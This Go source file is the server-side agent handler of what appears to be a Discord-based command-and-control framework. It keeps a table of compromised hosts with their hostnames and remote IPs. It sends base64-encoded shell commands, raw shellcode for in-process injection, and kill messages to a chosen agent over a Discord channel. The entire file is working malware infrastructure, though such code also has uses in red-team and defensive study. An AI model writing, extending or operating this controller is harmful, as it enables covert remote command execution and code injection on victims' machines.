package c2agents

// c2agents is the SERVER side agent handler

import (
	"DaaC2/pkg/c2agent"
	"DaaC2/pkg/c2discord"
	"DaaC2/pkg/c2message"

	"github.com/bwmarrin/discordgo"
)

// Global variables for the server side agents
var (
	FocusedAgent string                     // this will only be a value if we are interacting with an agent
	AllAgents    []*c2agent.AgentServerInfo // used to track all the agents
)

// AddAgentToKnownTable adds the agent information to a global look up table
func AddAgentToKnownTable(agentID string, hostname string, remoteIP string, time string) {
	newAgent := &c2agent.AgentInfo{}
	newAgent.AgentID = agentID
	newAgent.HostName = hostname
	newAgent.RemoteIP = remoteIP
	newAgent.TimeInitialised = time

	newServerAgent := &c2agent.AgentServerInfo{}
	newServerAgent.Agent = newAgent
	newServerAgent.Status = "alive"

	AllAgents = append(AllAgents, newServerAgent)
}

// RemoveAgentFromKnownTable finds the target agent and removes it from the known table
func RemoveAgentFromKnownTable(agentID string) {
	backup := []*c2agent.AgentServerInfo{}

	for _, v := range AllAgents {
		if v.Agent.AgentID != agentID {
			backup = append(backup, v)
		}
	}

	// backup should now have all the agents, without our target one to remove. Replace AllAgents with this
	AllAgents = backup
}

// DoesAgentExistOnServer gets called when a ping is received to make sure the agent is known by the server
func DoesAgentExistOnServer(agentID string) bool {
	exists := false
	for _, v := range AllAgents {
		if v.Agent.AgentID == agentID {
			exists = true
		}
	}
	return exists
}

// functions to create and send certain messages. Not the smartest code I've ever written but w/e it works

// CreateAndSendCommandMessage is a some what "job" creation func?
func CreateAndSendCommandMessage(dg *discordgo.Session, cmdData string) {
	// cmdData is likely to be a small collection of data? i.e `command ls`
	cmd := cmdData[8:]

	// build our message to send to the agent
	newMessage := c2message.CreateNewMessage(c2message.MESSAGE_COMMAND, "SERVER", FocusedAgent, cmd)
	base64str := c2message.EncodeMessageObject(newMessage)
	dg.ChannelMessageSend(c2discord.ChannelID, base64str)
}

// CreateAndSendShellcodeMessage sends raw shellcode to the agent to inject into the current process
func CreateAndSendShellcodeMessage(dg *discordgo.Session, shellcode string) {
	newMessage := c2message.CreateNewMessage(c2message.MESSAGE_SHELLCODE, "SERVER", FocusedAgent, shellcode)
	base64str := c2message.EncodeMessageObject(newMessage)
	dg.ChannelMessageSend(c2discord.ChannelID, base64str)
}

// CreateAndSendKillMessage sends a kill message for the target agent
func CreateAndSendKillMessage(dg *discordgo.Session) {
	newMessage := c2message.CreateNewMessage(c2message.MESSAGE_KILL, "SERVER", FocusedAgent, "")
	base64str := c2message.EncodeMessageObject(newMessage)
	dg.ChannelMessageSend(c2discord.ChannelID, base64str)
}
